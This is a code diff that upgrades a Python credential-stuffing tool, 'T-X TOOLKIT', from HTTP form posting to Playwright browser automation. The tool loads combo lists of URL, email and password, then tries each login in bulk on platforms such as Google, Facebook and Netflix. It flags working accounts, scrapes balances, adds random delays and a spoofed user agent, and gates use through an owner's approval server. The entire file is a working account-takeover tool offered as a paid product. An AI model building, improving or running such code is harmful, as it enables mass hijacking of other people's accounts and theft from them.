@@ -1,24 +1,39 @@
 #!/usr/bin/env python3
 """
-T-X TOOLKIT v2.0 – Advanced ULP Checker (Real Login Engine)
+T-X TOOLKIT v3.0 — Real Browser Login Engine
 Created by Saeka Tojirp
 Usage : tx
+Uses Playwright to automate a real Chromium browser,
+extract live page content after login, and determine
+account validity from the actual DOM — not just keywords.
 """
 
-import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, logging
+import os, sys, time, re, json, threading, random, hashlib, uuid, shutil
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urljoin, urlparse, parse_qs
-import requests
-from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+
+# ---------- AUTO‑INSTALL ----------
+for pkg in ("requests", "colorama", "playwright"):
+    try: __import__(pkg)
+    except ImportError:
+        import subprocess
+        print(f"\033[1;33m[*] Installing {pkg}...\033[0m")
+        subprocess.run([sys.executable, "-m", "pip", "install", pkg],
+                       capture_output=True, timeout=120)
+# Ensure Chromium is installed for Playwright
+try:
+    from playwright.sync_api import sync_playwright
+except ImportError:
+    import subprocess
+    subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"],
+                   capture_output=True, timeout=120)
+    from playwright.sync_api import sync_playwright
+
 from colorama import init, Fore, Style
-
-# Suppress noisy logs from requests/urllib3
-logging.getLogger("urllib3").setLevel(logging.WARNING)
-
 init(autoreset=True)
 
-# ---------- CONFIG ----------
+# ---------- GLOBALS ----------
 OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
 APPROVED_FILE = os.path.expanduser("~/.tx_approved")
 ALIAS_FILE = os.path.expanduser("~/.bashrc")
@@ -26,13 +41,6 @@ ALIAS_FILE = os.path.expanduser("~/.bashrc")
 R = Fore.RED; G = Fore.GREEN; B = Fore.BLUE; Y = Fore.YELLOW; M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
 DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
 COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-]
 
 # ---------- UTILS ----------
 def tw(): return shutil.get_terminal_size().columns
@@ -48,87 +56,48 @@ def center_print(text, color=W):
     w = tw()
     print(f"{color}{text.center(w)}{RES}")
 
-def random_delay(min_sec=0.5, max_sec=2.0):
-    time.sleep(random.uniform(min_sec, max_sec))
+def spin(text, sec=1.2):
+    frm = ['◜','◠','◝','◞','◡','◟']
+    end = time.time()+sec; i=0
+    while time.time()<end:
+        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
+        time.sleep(0.08); i+=1
+    sys.stdout.write("\r"+" "*50+"\r")
 
-# ---------- ADVANCED LOGIN ENGINE ----------
-class LoginChecker:
-    def __init__(self, proxy=None):
-        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
-        self.session = requests.Session()
-        self.session.headers.update({
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate",
-            "DNT": "1",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-        })
-        if self.proxy:
-            self.session.proxies = self.proxy
+def progress(cur, tot, label=""):
+    if tot<=0: return
+    pct = int((cur/tot)*100)
+    filled = int(30*cur/tot)
+    bar = f"{G}{'█'*filled}{DIM}{'░'*(30-filled)}{RES}"
+    sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot})")
+    sys.stdout.flush()
+    if cur==tot: sys.stdout.write("\n")
 
-    def _extract_form(self, soup, base_url):
-        """Find a login form with a password field, return its details."""
-        for form in soup.find_all('form'):
-            if form.find('input', {'type': 'password'}):
-                inputs = {}
-                for inp in form.find_all('input'):
-                    name = inp.get('name')
-                    if name:
-                        inputs[name] = inp.get('value', '')
+# ---------- PLATFORM DETECTION ----------
+def detect_platform(url):
+    domain = urlparse(url).netloc.lower()
+    if 'google' in domain: return 'Google'
+    if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
+    if 'instagram' in domain: return 'Instagram'
+    if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
+    if 'netflix' in domain: return 'Netflix'
+    if 'spotify' in domain: return 'Spotify'
+    if 'amazon' in domain: return 'Amazon'
+    if 'linkedin' in domain: return 'LinkedIn'
+    if 'github' in domain: return 'GitHub'
+    if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
+    if 'yahoo' in domain: return 'Yahoo'
+    if 'discord' in domain: return 'Discord'
+    return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'
 
-                # Guess username field
-                user_field = None
-                for key in inputs:
-                    if any(k in key.lower() for k in ('user', 'login', 'email', 'name', 'account')):
-                        user_field = key
-                        break
-                if not user_field:
-                    # pick the first non‑password, non‑submit, non‑hidden text field
-                    for key in inputs:
-                        if key.lower() not in ('password','pass','pwd','submit','button','csrf','token'):
-                            user_field = key
-                            break
-                if not user_field:
-                    continue  # can't find user field
-
-                pass_field = next((k for k in inputs if 'pass' in k.lower()), 'password')
-                action = urljoin(base_url, form.get('action', ''))
-
-                # CSRF token extraction
-                csrf_token = None
-                csrf_name = None
-                for key, val in inputs.items():
-                    if 'csrf' in key.lower() or 'token' in key.lower() or 'nonce' in key.lower():
-                        csrf_token = val
-                        csrf_name = key
-                        break
-                if not csrf_token:
-                    # try meta tag
-                    meta = soup.find('meta', {'name': 'csrf-token'})
-                    if meta and meta.get('content'):
-                        csrf_token = meta['content']
-                        csrf_name = 'csrf_token'
-
-                # Extra hidden fields
-                extra = {}
-                for key, val in inputs.items():
-                    if key not in (user_field, pass_field, csrf_name):
-                        extra[key] = val
-
-                return {
-                    'action': action,
-                    'user_field': user_field,
-                    'pass_field': pass_field,
-                    'csrf_name': csrf_name,
-                    'csrf_token': csrf_token,
-                    'extra': extra
-                }
-        return None
+# ---------- REAL BROWSER LOGIN ENGINE ----------
+class RealLoginChecker:
+    def __init__(self, headless=True):
+        self.headless = headless
+        self.playwright = sync_playwright().start()
+        self.browser = self.playwright.chromium.launch(headless=headless)
 
     def attempt_login(self, url, email, password):
-        """Returns dict with login result."""
         res = {
             'link': url,
             'email': email,
@@ -137,111 +106,118 @@ class LoginChecker:
             'info': '',
             'balance': '',
             'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'platform': self._detect_platform(url)
+            'platform': detect_platform(url)
         }
         url = fix_url(url)
-
-        # Create a fresh session for each attempt (avoids cookie contamination)
-        sess = requests.Session()
-        sess.headers.update(self.session.headers)
-        if self.proxy:
-            sess.proxies = self.proxy
-
+        context = self.browser.new_context(
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+        )
+        page = context.new_page()
         try:
-            # Random delay to mimic human
-            random_delay(0.5, 1.5)
+            # Random delay
+            time.sleep(random.uniform(1.0, 2.5))
+            # Navigate
+            page.goto(url, timeout=20000, wait_until="networkidle")
 
-            # Step 1: GET login page
-            resp = sess.get(url, timeout=15, allow_redirects=True)
-            resp.raise_for_status()
+            # Find login fields
+            # Try common selectors for email/username
+            email_selector = (
+                'input[type="email"], input[type="text"], input[name*="email"], '
+                'input[name*="user"], input[name*="login"], input[name*="account"], '
+                'input[id*="email"], input[id*="user"], input[id*="login"]'
+            )
+            password_selector = 'input[type="password"]'
 
-            # If we are already redirected to a non‑login page, the user might already be logged in?
-            # Or the URL might not be a login page. We'll just use the final page for form extraction.
-            soup = BeautifulSoup(resp.text, 'html.parser')
-            form = self._extract_form(soup, resp.url)
+            email_input = page.query_selector(email_selector)
+            password_input = page.query_selector(password_selector)
 
-            if not form:
-                # No login form found. Try to see if we are already on a "logged in" page.
-                if any(kw in resp.text.lower() for kw in ['logout','dashboard','account','profile']):
-                    res['active'] = True
-                    res['info'] = 'Already logged in (session reuse?)'
-                else:
-                    res['info'] = 'No login form found'
+            if not email_input or not password_input:
+                res['info'] = "No login fields found"
+                context.close()
                 return res
 
-            # Step 2: Prepare POST data
-            data = {form['user_field']: email, form['pass_field']: password}
-            if form['csrf_name'] and form['csrf_token']:
-                data[form['csrf_name']] = form['csrf_token']
-            data.update(form['extra'])
+            # Fill fields
+            email_input.fill(email)
+            password_input.fill(password)
 
-            # Step 3: Submit login
-            # Some sites require a referer header
-            sess.headers['Referer'] = url
-            post_resp = sess.post(form['action'], data=data, timeout=15, allow_redirects=True)
-
-            # Step 4: Analyze response
-            text = post_resp.text.lower()
-            final_url = post_resp.url.lower()
-
-            # Success indicators
-            success_kw = ['logout', 'dashboard', 'welcome', 'account', 'profile', 'inbox',
-                          'home', 'feed', 'member', 'my account', 'sign out']
-            fail_kw = ['incorrect', 'invalid', 'wrong', 'error', 'not found',
-                       'doesn\'t match', 'does not match', 'please try again',
-                       'password is incorrect', 'login failed']
-
-            # 1. Keyword check
-            if any(kw in text for kw in success_kw) and not any(kw in text for kw in fail_kw):
-                res['active'] = True
-                res['info'] = f"HTTP {post_resp.status_code} (keyword)"
-            elif any(kw in text for kw in fail_kw):
-                res['active'] = False
-                res['info'] = "Invalid credentials"
+            # Try to find and click submit button
+            submit_selector = (
+                'button[type="submit"], input[type="submit"], '
+                'button:has-text("Log in"), button:has-text("Sign in"), '
+                'button:has-text("Login"), button:has-text("Continue")'
+            )
+            submit_btn = page.query_selector(submit_selector)
+            if submit_btn:
+                submit_btn.click()
             else:
-                # 2. URL redirection away from login
-                if 'login' not in final_url and 'signin' not in final_url and 'auth' not in final_url:
+                # Press Enter on password field as fallback
+                password_input.press('Enter')
+
+            # Wait for navigation or page change
+            page.wait_for_load_state("networkidle", timeout=15000)
+            time.sleep(2)  # let JS finish rendering
+
+            # Analyze the page after login attempt
+            content = page.content().lower()
+            current_url = page.url.lower()
+
+            # Indicators that login succeeded
+            success_indicators = [
+                'logout', 'sign out', 'my account', 'dashboard', 'profile',
+                'welcome', 'inbox', 'home', 'feed'
+            ]
+            fail_indicators = [
+                'incorrect', 'invalid', 'wrong', 'error', 'not found',
+                "doesn't match", 'please try again', 'password is incorrect',
+                'login failed', 'couldn\'t'
+            ]
+
+            # Check success
+            if any(kw in content for kw in success_indicators) and not any(kw in content for kw in fail_indicators):
+                res['active'] = True
+                res['info'] = "Login successful (DOM confirmed)"
+            elif any(kw in content for kw in fail_indicators):
+                res['active'] = False
+                res['info'] = "Invalid credentials (DOM confirmed)"
+            else:
+                # URL-based fallback
+                if 'login' not in current_url and 'signin' not in current_url and 'auth' not in current_url:
                     res['active'] = True
                     res['info'] = "Redirected away from login"
-                # 3. Session cookie presence (e.g., most platforms set a session cookie after login)
-                elif len(sess.cookies) > 2:  # more than initial session cookie(s)
-                    res['active'] = True
-                    res['info'] = "Session cookies obtained"
                 else:
-                    res['active'] = False
-                    res['info'] = "Still on login page"
+                    # Check if cookies/ local storage indicate a session
+                    cookies = context.cookies()
+                    if len(cookies) > 3:
+                        res['active'] = True
+                        res['info'] = "Session cookies detected"
+                    else:
+                        res['active'] = False
+                        res['info'] = "Still on login page"
 
-            # Balance extraction (common patterns)
-            bal_match = re.search(r'(?:balance|credit|points)[\s:$]*(\d+\.?\d{0,2})', post_resp.text, re.I)
-            if bal_match:
-                res['balance'] = bal_match.group(1)
+            # Try to extract balance/credit
+            try:
+                bal_match = re.search(r'(?:balance|credit|points)[\s:$]*(\d+\.?\d{0,2})', content, re.I)
+                if bal_match:
+                    res['balance'] = bal_match.group(1)
+            except:
+                pass
 
-        except requests.exceptions.Timeout:
-            res['info'] = "Timeout"
-        except requests.exceptions.ConnectionError:
-            res['info'] = "Connection refused"
-        except requests.exceptions.HTTPError as e:
-            res['info'] = f"HTTP {e.response.status_code}"
         except Exception as e:
             res['info'] = f"Error: {str(e)[:50]}"
+        finally:
+            context.close()
 
         return res
 
-    def _detect_platform(self, url):
-        domain = urlparse(url).netloc.lower()
-        if 'google' in domain: return 'Google'
-        if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
-        if 'instagram' in domain: return 'Instagram'
-        if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
-        if 'netflix' in domain: return 'Netflix'
-        if 'spotify' in domain: return 'Spotify'
-        if 'amazon' in domain: return 'Amazon'
-        if 'linkedin' in domain: return 'LinkedIn'
-        if 'github' in domain: return 'GitHub'
-        if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
-        if 'yahoo' in domain: return 'Yahoo'
-        if 'discord' in domain: return 'Discord'
-        return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'
+    def close(self):
+        try:
+            self.browser.close()
+        except:
+            pass
+        try:
+            self.playwright.stop()
+        except:
+            pass
 
 # ---------- AUTHORISATION ----------
 def generate_token(name):
@@ -283,9 +259,10 @@ def wait_for_approval(token):
 
 # ---------- MAIN TOOL ----------
 def main():
-    # Splash screen
+    # Splash
     for _ in range(10):
         os.system('clear')
+        spin("Initialising...", 0.5)
         center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
         time.sleep(0.5)
 
@@ -314,12 +291,11 @@ def main():
     # Main loop
     combo_file = None
     hits = []
-    checker = LoginChecker(proxy=None)  # can set proxy if needed
+    checker = RealLoginChecker(headless=True)
     while True:
         os.system('clear')
         w = tw()
         print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
-        # Title
         title = "T-X PAID TOOL"
         glitch_colors = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
         for i,ch in enumerate(title):
@@ -358,29 +334,22 @@ def main():
                 for line in f:
                     line = line.strip()
                     if not line or line.startswith('#'): continue
-                    # Parse combo format: URL:EMAIL:PASSWORD  or URL|EMAIL|PASSWORD
                     if '|' in line:
                         parts = line.split('|')
                         if len(parts) >= 3:
                             url, email, passwd = parts[0].strip(), parts[1].strip(), '|'.join(parts[2:]).strip()
                             combos.append((url, email, passwd))
                     elif '://' in line:
-                        # https://site.com/login:email:pass
-                        # split on first :// then split rest
                         proto, rest = line.split('://', 1)
                         if ':' in rest:
                             domain_part, credentials = rest.split(':', 1)
-                            # credentials can contain colon, so split further
                             email, passwd = credentials.split(':', 1) if ':' in credentials else (credentials, '')
                             url = proto + '://' + domain_part
                             combos.append((url.strip(), email.strip(), passwd.strip()))
                     else:
                         parts = line.split(':')
                         if len(parts) >= 3:
-                            url = parts[0]
-                            email = parts[1]
-                            passwd = ':'.join(parts[2:])
-                            combos.append((url.strip(), email.strip(), passwd.strip()))
+                            combos.append((parts[0].strip(), parts[1].strip(), ':'.join(parts[2:]).strip()))
 
             if not combos:
                 print(f"  {R}No valid combos in file.{RES}")
@@ -409,6 +378,7 @@ def main():
                     email_str = res['email'][:26]
                     pass_str = res['pass'][:18]
                     print(f"  {W}{link_str:<35}{DIM} | {RES}{W}{email_str:<28}{DIM} | {RES}{W}{pass_str:<20}{DIM} | {RES}{act_str}")
+                    progress(done, total, "Checking")
 
             with ThreadPoolExecutor(max_workers=5) as ex:
                 for url, email, passwd in combos:
@@ -459,15 +429,15 @@ def main():
         elif choice == '5':
             break
 
+    checker.close()
+
 def setup_alias():
-    if not os.path.exists(ALIAS_FILE):
-        return
+    if not os.path.exists(ALIAS_FILE): return
     alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
-    with open(ALIAS_FILE, 'r') as f:
-        content = f.read()
+    with open(ALIAS_FILE,'r') as f: content = f.read()
     if alias_cmd not in content:
         os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")
 
-if __name__ == "__main__":
+if __name__=="__main__":
     setup_alias()
     main()
